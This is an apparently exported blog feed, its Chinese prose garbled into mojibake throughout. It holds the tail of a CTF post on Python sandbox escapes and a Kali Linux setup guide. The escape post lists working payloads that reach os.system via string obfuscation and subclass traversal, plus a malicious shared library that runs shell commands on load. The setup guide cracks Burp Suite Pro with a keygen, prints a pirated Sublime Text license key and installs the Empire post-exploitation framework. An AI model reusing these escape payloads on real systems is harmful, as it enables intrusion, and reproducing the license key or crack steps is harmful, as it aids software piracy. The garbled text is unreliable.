  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">open</span>(<span class="string">'/usr/lib/python3.8/os.py'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    exec(f.read())</span><br><span class="line"><span class="keyword">system</span>(<span class="string">'whoami'</span>)</span><br><span class="line"><span class="comment">#æˆ–è€…</span></span><br><span class="line">sys.modules[<span class="string">'os'</span>]= <span class="string">'/usr/lib/python3.8/os.py'</span></span><br><span class="line"><span class="comment">#æˆ–</span></span><br><span class="line">del sys.modules[<span class="string">'os'</span>] //å½“ <span class="keyword">import</span> ä¸€ä¸ªæ¨¡å—æ—¶ï¼š<span class="keyword">import</span> Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º <span class="keyword">module</span> å¯¹è±¡ï¼Œå¹¶åŠ è½½ Aã€‚æ‰€ä»¥åˆ äº† sys.modules[<span class="string">'os'</span>] åªä¼šè®© Python é‡æ–°åŠ è½½ä¸€æ¬¡ osã€‚</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="èŠ±å¼å¤„ç†å­—ç¬¦ä¸²"><a href="#èŠ±å¼å¤„ç†å­—ç¬¦ä¸²" class="headerlink" title="èŠ±å¼å¤„ç†å­—ç¬¦ä¸²"></a>èŠ±å¼å¤„ç†å­—ç¬¦ä¸²</h4><p>  å­—ç¬¦ä¸²æ‹¼æ¥</p>
  <figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>(<span class="string">'o'</span>+<span class="string">'s'</span>).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure>

<p>  å­—ç¬¦ä¸²é€†è½¬</p>
  <figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span>(<span class="string">'so'</span>[::-<span class="number">1</span>])<span class="selector-class">.system</span>(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<p>  å˜é‡æ›¿æ¢</p>
  <figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">a</span>=<span class="string">'o'</span></span><br><span class="line">b=<span class="string">'s'</span></span><br><span class="line">__import__(<span class="keyword">a</span>+b).<span class="keyword">system</span>(<span class="string">"whoami"</span>)</span><br></pre></td></tr></table></figure>

<p>  ç¼–ç </p>
  <figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">__import__</span>((<span class="variable">bytes.fromhex</span>(<span class="string">"6f73"</span>).decode())).system(<span class="string">'whoami'</span>)</span></span><br></pre></td></tr></table></figure>

<p>  åˆ«å</p>
  <figure class="highlight elm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">as</span> o</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="ç»§æ‰¿é€ƒé€¸"><a href="#ç»§æ‰¿é€ƒé€¸" class="headerlink" title="ç»§æ‰¿é€ƒé€¸"></a>ç»§æ‰¿é€ƒé€¸</h4><p>  pythonä¸­ä¸‡ç‰©çš†å¯¹è±¡ã€‚é€šè¿‡å„ç§é­”æœ¯å‡½æ•°å¯ä»¥åœ¨ç»§æ‰¿é“¾ä¸Šæ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„å‡½æ•°ã€‚ä¹Ÿå¯ä»¥é€šè¿‡è„šæœ¬FUZZä¸€ä¸‹</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è¿™é‡Œåªçˆ†ç ´äº†ä¸€å±‚</span></span><br><span class="line"><span class="comment"># object</span></span><br><span class="line"><span class="comment"># [].__class__.__base__</span></span><br><span class="line"><span class="comment"># "".__class__.__mro__[-1]</span></span><br><span class="line">methods=[<span class="string">'os'</span>,<span class="string">'subprocess'</span>] <span class="comment"># sys __import__ __builtins__ </span></span><br><span class="line"></span><br><span class="line">classes = [].__class__.__base__.__subclasses__()</span><br><span class="line">res = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line"></span><br><span class="line">    res[met] = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(classes)):</span><br><span class="line">        cla = str(classes[i])</span><br><span class="line">        <span class="keyword">if</span> met <span class="keyword">in</span> cla:</span><br><span class="line">            res[met].append(str(i) + <span class="string">" "</span> + cla)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># dir() ä¸ä¼šåˆ—å‡ºå†…ç½®å‡½æ•°å’Œå˜é‡åç§°æ‰€ä»¥ execå’Œevalåªèƒ½çˆ†ç ´ï¼Œæˆ–è€…åˆ©ç”¨å…¶ä»–åŒ…çš„__builtins__è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"__globals__"</span> <span class="keyword">in</span> dir(classes[i].__init__):</span><br><span class="line">            <span class="keyword">if</span> met <span class="keyword">in</span> classes[i].__init__.__globals__:</span><br><span class="line">                res[met].append(str(i)+ <span class="string">" "</span>+cla)</span><br><span class="line"><span class="keyword">for</span> met <span class="keyword">in</span> methods:</span><br><span class="line">    print(met + <span class="string">":"</span> + str(res[met]))</span><br></pre></td></tr></table></figure>

<p>  ç±»çš„åºå·åœ¨ä¸åŒçš„pyç‰ˆæœ¬ï¼Œè¿è¡Œå¹³å°ï¼Œä»¥åŠimportä¸åŒçš„åŒ…ï¼Œéƒ½ä¼šé€ æˆ<code>object</code>çš„å­ç±»æ•°é‡ä¸ä¸€æ ·ï¼Œåºå·ä¹Ÿå°±ä¸ä¸€æ ·äº†ã€‚è„šæœ¬ä¹Ÿå°±æ„é€ ä¸‹payloadï¼Œè¿œç¨‹æ‰“è¿‡å»è¿˜å¾—çˆ†ç ´åºå·ã€‚</p>
</li>
<li><h4 id="åŠ è½½æ¶æ„so"><a href="#åŠ è½½æ¶æ„so" class="headerlink" title="åŠ è½½æ¶æ„so"></a>åŠ è½½æ¶æ„so</h4><p>  åˆ©ç”¨<code>ctypes.LibraryLoader</code>åŠ è½½æ¶æ„åŠ¨æ€åº“æ‰§è¡Œå‘½ä»¤ã€‚<code>ctypes</code>å¿…é¡»è¦å¯¼å…¥ï¼Œä¸ç„¶<code>object</code>ä¸ä¼šæœ‰å®ƒã€‚æ„Ÿè§‰æœ‰äº›é¸¡è‚‹ã€‚</p>
<p>  evil.c</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">evil</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ls -la  &gt; /tmp/ls_la"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  poc.py</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">167</span>](<span class="string">'/tmp/evil.so'</span>)</span><br></pre></td></tr></table></figure>

<p>  <img src="/2020/06/python-webå­¦ä¹ /image-20200701212037508.png" alt="image-20200701212037508"></p>
</li>
<li><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><p>  è¿‡æ»¤<code>[</code>ã€<code>]</code>ï¼Œåº”å¯¹çš„æ–¹å¼å°±æ˜¯å°†[]çš„åŠŸèƒ½ç”¨pop ã€<code>__getitem__</code> ä»£æ›¿ï¼ˆå®é™…ä¸Ša[0]å°±æ˜¯åœ¨å†…éƒ¨è°ƒç”¨äº†<code>a.__getitem__(0)</code> )</p>
<p>   <code>&#39;&#39;.__class__.__mro__.__getitem__(1).__subclasses__().pop(59).__init__.func_globals.get(&#39;linecache&#39;).os.popen(&#39;whoami&#39;).read()</code></p>
</li>
</ul>
<ul>
<li><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><p>  <a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98" target="_blank" rel="noopener">æ²™ç›’é€ƒé€¸å¤‡å¿˜</a></p>
<p>  <a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">python-æ²™ç®±é€ƒé€¸</a></p>
<p>  <a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">ä¸€æ–‡çœ‹æ‡‚Pythonæ²™ç®±é€ƒé€¸</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>kaliå®‰è£…ä¸é…ç½®</title>
    <url>/2020/04/kali%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ä¸¤ä¸ªæœˆå‰ æˆ‘è¾“å…¥äº†è¿™æ¡ç¥å¥‡çš„å‘½ä»¤ <code>rm /*</code>å°‘äº†ä¸€ä¸ªç‚¹ï¼Œç„¶åé‡è£…äº†ä¸€ä¸‹kali</p><p>æ˜¨å¤©å®‰è£…è½¯ä»¶çš„æ—¶å€™çªç„¶å‘ç° <code>/dev/sda1</code>ç©ºé—´ç”¨å®Œäº† åäº†</p><p>å†ä¹Ÿä¸ç©é«˜çº§çš„åˆ†åŒºæ¨¡å¼äº†</p><p>ä»Šå¤©é‡æ–°å®‰è£…ï¼Œåˆ†åŒºé€‰æ–°æ‰‹æ¨¡å¼äº†ï¼</p><p>è¿™é‡Œä¸»è¦è®°å½•ä¸€ä¸‹å¦‚ä½•é…ç½®kali</p><h3 id="1-å®‰è£…è°·æ­Œè¾“å…¥æ³•"><a href="#1-å®‰è£…è°·æ­Œè¾“å…¥æ³•" class="headerlink" title="1.å®‰è£…è°·æ­Œè¾“å…¥æ³•"></a>1.å®‰è£…è°·æ­Œè¾“å…¥æ³•</h3><p>å¦‚æœä¸‹è½½é€Ÿåº¦æ…¢ï¼Œé€‰æ‹©æŒ‚ä»£ç†æˆ–è€…æ¢æº</p><ol>
<li><p>å…ˆæ›´æ–°ä»“åº“</p>
<p> <code>sudo apt-get clean</code></p>
<p> <code>sudo apt-get update</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422165456991.png" alt="image-20200422165456991"></p>
</li>
</ol><a id="more"></a>






<ol start="2">
<li><p>å®‰è£…fcitx</p>
<p> <code>sudo apt-get install fcitx</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422165915271.png" alt="image-20200422165915271"></p>
</li>
</ol>
<ol start="3">
<li><p>å®‰è£…è°·æ­Œæ‹¼éŸ³</p>
<p> <code>sudo apt-get install fcitx-googlepinyin</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422170051383.png" alt="image-20200422170051383"></p>
</li>
</ol>
<ol start="5">
<li><p>é‡å¯</p>
<p> <code>sudo reboot</code></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422171933298.png" alt="image-20200422171933298"></p>
</li>
</ol>
<h3 id="2-å®‰è£…ç ´è§£ç‰ˆBurpSuit"><a href="#2-å®‰è£…ç ´è§£ç‰ˆBurpSuit" class="headerlink" title="2.å®‰è£…ç ´è§£ç‰ˆBurpSuit"></a>2.å®‰è£…ç ´è§£ç‰ˆBurpSuit</h3><ol>
<li><p>å®‰è£…JAVA8</p>
<p> <code>cd /opt/</code></p>
<p> <code>sudo wget https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422173241147.png" alt="image-20200422173241147"></p>
</li>
</ol>
<ol start="2">
<li><p>è§£å‹</p>
<p> <code>sudo tar -zxvf jdk-8u202-linux-x64.tar.gz</code></p>
</li>
<li><p>è®¾ç½®ç¯å¢ƒå˜é‡</p>
<p>  <code>sudo mousepad ~/.bashrc</code></p>
<p> æœ€ä¸‹é¢åŠ ä¸Š</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#JAVA</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/jdk1.8.0_202</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin/:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422174554381.png" alt="image-20200422174554381"></p>
</li>
<li><p>ä¿®æ”¹/etc/profile</p>
<p> <code>sudo mousepad /etc/profile</code></p>
<p> æ·»åŠ </p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŠ è½½.bashrcæ–‡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -f .bashrc ; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">source</span> .bashrc </span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p> é¿å…æ¯æ¬¡è¿›shelléƒ½è¦æ›´æ–°é…ç½®æ–‡ä»¶</p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422175335303.png" alt="image-20200422175335303"></p>
</li>
<li><p>å®‰è£…å¹¶æ³¨å†Œ</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_202/bin/java 1</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_202/bin/javac 1</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --<span class="built_in">set</span> java /opt/jdk1.8.0_202/bin/java</span><br><span class="line"></span><br><span class="line">sudo update-alternatives --<span class="built_in">set</span> javac /opt/jdk1.8.0_202/bin/javac</span><br></pre></td></tr></table></figure>

<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422175852100.png" alt="image-20200422175852100"></p>
</li>
<li><p>ç ´è§£burpsuit</p>
<p><code>sudo mkdir /opt/burpsuit</code></p>
<p><code>sudo mv burp-loader-keygen-2020_1.jar burpsuite_pro_v2020.1.jar /opt/burpsuit/</code></p>
</li>
</ol>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422183206266.png" alt="image-20200422183206266"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422193327897.png" alt="image-20200422193327897"></p>
<p>è¿è¡ŒåŠ è½½å™¨åï¼Œæ­£å¸¸ç ´è§£å³å¯</p>
<p>7.åˆ›å»ºå¿«æ·æ–¹å¼</p>
<p><code>sudo rm -rf /usr/bin/burpsuite</code> </p>
<p> <code>sudo touch /usr/bin/burpsuite</code></p>
<p> <code>sudo mousepad /usr/bin/burpsuite</code></p>
<p>æ·»åŠ ä»¥ä¸‹å†…å®¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /opt/burpsuit &amp;&amp; java -noverify -Xbootclasspath/p:burp-loader-keygen-2020_1.jar -jar burpsuite_pro_v2020.1.jar</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422194026070.png" alt></p>
<p>å¢åŠ æ‰§è¡Œæƒé™</p>
<p><code>sudo chmod +x /usr/bin/burpsuite</code></p>
<p>ä¿®æ”¹å¿«æ·æ–¹å¼</p>
<p><code>sudo mousepad /usr/share/applications/kali-burpsuite.desktop</code> </p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422194502658.png" alt="image-20200422194502658"></p>
<p>æŠŠ<code>Exec=sh -c &quot;java -jar /usr/bin/burpsuite</code>æ”¹ä¸º<code>Exec=sh -c &quot;/usr/bin/burpsuite</code></p>
<p>ç„¶åå‘½ä»¤è¡Œå’Œå›¾æ ‡éƒ½èƒ½è¿è¡Œäº†</p>
<h3 id="3-å®‰è£…Subline-text3"><a href="#3-å®‰è£…Subline-text3" class="headerlink" title="3.å®‰è£…Subline text3"></a>3.å®‰è£…Subline text3</h3><ol>
<li><p>å®‰è£…GPG</p>
<p> <code>wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -</code></p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422195424105.png" alt="image-20200422195424105"></p>
</li>
<li><p>ç¡®ä¿aptè¢«è®¾ç½®ä¸ºhttpsæº</p>
<p>  <code>sudo apt-get install apt-transport-https</code></p>
</li>
</ol>
<p>â€‹    </p>
<ol start="3">
<li><p>é€‰æ‹©ç¨³å®šç‰ˆæœ¬</p>
<p><code>echo &quot;deb https://download.sublimetext.com/ apt/stable/&quot; | sudo tee /etc/apt/sources.list.d/sublime-text.list</code></p>
</li>
<li><p>å®‰è£…sublime-text3</p>
<p> <code>sudo apt-get update</code></p>
<p> <code>sudo apt-get install sublime-text</code></p>
<p> å¯èƒ½ä¼šå¾ˆæ…¢ï¼Œå»ºè®®ä»£ç†</p>
</li>
<li><p>æ±‰åŒ–sublime</p>
<p>æŒ‰ctrl+shift+p,è°ƒå‡ºéšè—çª—å£,å…ˆå®‰è£…åŒ…æ§åˆ¶<br><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422201255164.png" alt="image-20200422201255164"></p>
<p>Perferences-&gt;Package Control-&gt;install Package<br><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422201619067.png" alt="image-20200422201619067"></p>
<p>ä¹‹åè¾“å…¥ Localizations å®‰è£…å¯¹åº”æ’ä»¶ å›è½¦ç¡®è®¤ å³å¯å®ç°æ±‰åŒ–</p>
</li>
<li><p>å®‰è£…SublimeREPL åŒç†</p>
<p> é…ç½®python3ç¯å¢ƒ</p>
<p> <code>vim .config/sublime-text-3/Packages/SublimeREPL/config/Python/Main.sublime-menu</code></p>
<p> æŠŠcmd å¼€å¤´çš„å­—ç¬¦ä¸²ä¸­çš„pythonæ”¹æˆpython3</p>
<p> <img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200507210324333.png" alt="image-20200507210324333"></p>
</li>
<li><p>å®‰è£…anaconda</p>
<p> é…ç½®anaconda, é¦–é€‰é¡¹-&gt;Package Settings -&gt; Anaconda -&gt;Settings -User</p>
<p> ç²˜è´´ä»¥ä¸‹å†…å®¹</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;    </span><br><span class="line"><span class="attr">"anaconda_linting"</span>: <span class="literal">false</span>,</span><br><span class="line"><span class="attr">"python_interpreter"</span>: <span class="string">"/usr/bin/python3.7"</span>,</span><br><span class="line"><span class="attr">"suppress_explicit_completions"</span>:<span class="literal">true</span>,</span><br><span class="line"><span class="attr">"suppress_word_completion"</span>:<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> è®¾ç½®å¿«æ·é”® ï¼Œé¦–é€‰é¡¹-&gt;å¿«æ·é”®è®¾ç½® åœ¨userè¿™æ å¡«ä¸Š</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="attr">"keys"</span>: [<span class="string">"f5"</span>],</span><br><span class="line">    <span class="attr">"caption"</span>: <span class="string">"SublimeREPL: Python - RUN current file"</span>,</span><br><span class="line">    <span class="attr">"command"</span>: <span class="string">"run_existing_window_command"</span>,</span><br><span class="line">    <span class="attr">"args"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"repl_python_run"</span>,</span><br><span class="line">        <span class="attr">"file"</span>: <span class="string">"config/Python/Main.sublime-menu"</span>&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="attr">"keys"</span>: [<span class="string">"ctrl+f5"</span>],</span><br><span class="line">    <span class="attr">"caption"</span>: <span class="string">"SublimeREPL: Python - PDB current file"</span>,</span><br><span class="line">    <span class="attr">"command"</span>: <span class="string">"run_existing_window_command"</span>,</span><br><span class="line">    <span class="attr">"args"</span>: &#123;</span><br><span class="line">        <span class="attr">"id"</span>: <span class="string">"repl_python_pdb"</span>,</span><br><span class="line">        <span class="attr">"file"</span>: <span class="string">"config/Python/Main.sublime-menu"</span>&#125;</span><br><span class="line">    &#125;,   </span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p> f5è¿è¡Œpython  ctrl+f5 pdbè°ƒè¯•python</p>
</li>
<li><p>æ³¨å†Œç </p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">----- BEGIN LICENSE -----</span><br><span class="line">Member J2TeaM</span><br><span class="line">Single User License</span><br><span class="line">EA7E<span class="number">-1011316</span></span><br><span class="line">D7DA350E <span class="number">1</span>B8B0760 <span class="number">972</span>F8B60 F3E64036</span><br><span class="line">B9B4E234 F356F38F <span class="number">0</span>AD1E3B7 <span class="number">0E9</span>C5FAD</span><br><span class="line">FA0A2ABE <span class="number">25</span>F65BD8 D51458E5 <span class="number">3923</span>CE80</span><br><span class="line"><span class="number">87428428</span> <span class="number">79079</span>A01 AA69F319 A1AF29A4</span><br><span class="line">A684C2DC <span class="number">0</span>B1583D4 <span class="number">19</span>CBD290 <span class="number">217618</span>CD</span><br><span class="line"><span class="number">5653E0</span>A0 BACE3948 BB2EE45E <span class="number">422</span>D2C87</span><br><span class="line">DD9AF44B <span class="number">99</span>C49590 D2DBDEE1 <span class="number">75860</span>FD2</span><br><span class="line"><span class="number">8</span>C8BB2AD B2ECE5A4 EFC08AF2 <span class="number">25</span>A9B864</span><br><span class="line">------ END LICENSE ------</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="4-å®‰è£…AWVS13"><a href="#4-å®‰è£…AWVS13" class="headerlink" title="4.å®‰è£…AWVS13"></a>4.å®‰è£…AWVS13</h3><pre><code>awvså®‰è£…åŒ…ä¸‹è½½ `http://0verflow.cn/?p=1463`</code></pre><p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422221053236.png" alt="image-20200422221053236"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422221147845.png" alt="image-20200422221147845"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422221208598.png" alt="image-20200422221208598"></p>
<h3 id="5-å®‰è£…nessus"><a href="#5-å®‰è£…nessus" class="headerlink" title="5.å®‰è£…nessus"></a>5.å®‰è£…nessus</h3><p><a href="https://www.tenable.com/downloads/nessus?loginAttempted=true" target="_blank" rel="noopener">Nessuså®˜ç½‘</a>ä¸‹è½½å¯¹äºç‰ˆæœ¬çš„å®‰è£…åŒ…</p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422230607599.png" alt="image-20200422230607599"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422230308965.png" alt="image-20200422230308965"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422230627297.png" alt="image-20200422230627297"></p>
<p>æ¥ä¸‹æ¥è´¦å·å¯†ç éšæ„ï¼Œè®°å¾—å°±è¡Œ</p>
<p>è¿›å…¥è¿™ä¸ªé¡µé¢å</p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422230745749.png" alt="image-20200422230745749"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422231111879.png" alt="image-20200422231111879"></p>
<p>å¾—åˆ°challenge code</p>
<p>ç„¶åå»<a href="https://zh-cn.tenable.com/products/nessus/nessus-essentials?tns_redirect=true" target="_blank" rel="noopener">å®˜ç½‘æ³¨å†Œ</a>ä¸€ä¸ªè´¦å·ï¼Œé‚®ç®±å¿…é¡»æ˜¯æœ‰æ•ˆçš„ å¾—åˆ°activation code </p>
<p>åˆ°<code>https://plugins.nessus.org/offline.php</code>æäº¤å®ƒä»¬ï¼Œä¸‹è½½æ’ä»¶åŒ…</p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200422235202520.png" alt="image-20200422235202520"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200423001848981.png" alt="image-20200423001848981"></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200423001748972.png" alt="image-20200423001748972"></p>
<p>å°†plugin_feed_info.incæ–‡ä»¶æ›¿æ¢åˆ°<code>/opt/nessus/var/nessus/</code>ç›®å½• å’Œ<code>/opt/nessus/lib/nessus/plugins/</code>ç›®å½•</p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200423002118121.png" alt="image-20200423002118121"></p>
<h3 id="6-å®‰è£…pip"><a href="#6-å®‰è£…pip" class="headerlink" title="6.å®‰è£…pip"></a>6.å®‰è£…pip</h3><ol>
<li><p>pip2</p>
<p> <code>curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</code></p>
<p> <code>sudo python2 get-pip.py</code></p>
</li>
<li><p>pip3</p>
<p> <code>sudo apt-get install python3-pip</code></p>
</li>
</ol>
<h3 id="7-å®‰è£…Empire"><a href="#7-å®‰è£…Empire" class="headerlink" title="7.å®‰è£…Empire"></a>7.å®‰è£…Empire</h3><p>1.ä¸‹è½½Empire</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> https://github.com/EmpireProject/Empire.git</span><br></pre></td></tr></table></figure>

<p>2.æ›´æ–°&amp;&amp;å®‰è£…ä¾èµ–</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install make \</span><br><span class="line">g++ \ </span><br><span class="line">python-dev \</span><br><span class="line">swig python-pip \</span><br><span class="line">libxml2-dev \</span><br><span class="line">default-jdk \</span><br><span class="line">libssl1.0.2 \</span><br><span class="line">libssl-dev \</span><br><span class="line">build-essential</span><br><span class="line"><span class="built_in">cd</span> /Empire/setup</span><br><span class="line">sudo pip2 install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç¢°åˆ°pyinstallerå®‰è£…å¤±è´¥å°±è¿è¡Œä¸‹é¢çš„è¯­å¥</p>
<p> <code>pip2 install pyinstaller --no-use-pep517</code></p>
<p><img src="/2020/04/kaliå®‰è£…ä¸é…ç½®/image-20200513224644533.png" alt="image-20200513224644533"></p>
<p>å†æ¥ä¸€é <code>sudo pip2 install -r requirements.txt</code></p>
<p>3.ç¼–è¯‘å®‰è£…M2CryptoåŒ…</p>
<p>ç›´æ¥ç”¨è„šæœ¬æ˜¯è£…ä¸ä¸Šçš„ï¼Œä¹Ÿä¸çŸ¥é“ä¸ºå•¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> https://github.com/mcepl/M2Crypto</span><br><span class="line"><span class="built_in">cd</span> M2Crypto</span><br><span class="line">sudo python setup.py build</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>

<p> 4.æ­£å¼å®‰è£…</p>
<p><code>sudo ./start.sh</code></p>
<p>è¿™ä¸‹åº”è¯¥ä¸ä¼šæŠ¥é”™äº†</p>
<p>æ¥ç€</p>
<p><code>sudo ./reset.sh</code></p>
<p>æ¥ç€å¯èƒ½ä¼šæŠ¥ç¼ºå°‘ä»€ä¹ˆä»€ä¹ˆåŒ…ï¼Œç¼ºå•¥ç›´æ¥è£…å•¥(åŠ ä¸Šsudo)</p>
<p>æœ€åreset.sh è¿è¡ŒæˆåŠŸå°±å®‰è£…æˆåŠŸäº†</p>
]]></content>
      <categories>
        <category>ç¯å¢ƒæ­å»º</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>phpstrom+xdebugè°ƒè¯•ä»£ç </title>
    <url>/2021/01/phpstrom-xdebug%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81/</url>
